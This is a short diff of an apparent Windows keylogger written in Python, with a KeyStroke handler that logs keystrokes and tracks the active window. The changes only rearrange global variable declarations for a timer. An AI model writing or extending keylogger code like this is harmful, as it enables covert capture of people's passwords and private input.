@@ -10,7 +10,6 @@ kernel32 = ctypes.windll.kernel32
 psapi = ctypes.windll.psapi
 current_window = None
 
-global KeyLogs
 KeyLogs = ""
 start_time = time.time()
 max_time = 15 # 1 minute
@@ -51,6 +50,8 @@ def get_current_process():
 def KeyStroke(event):
     global KeyLogs
     global current_window
+    global start_time
+    global max_time
 
     # check to see if target changed windows
     if event.WindowName != current_window:
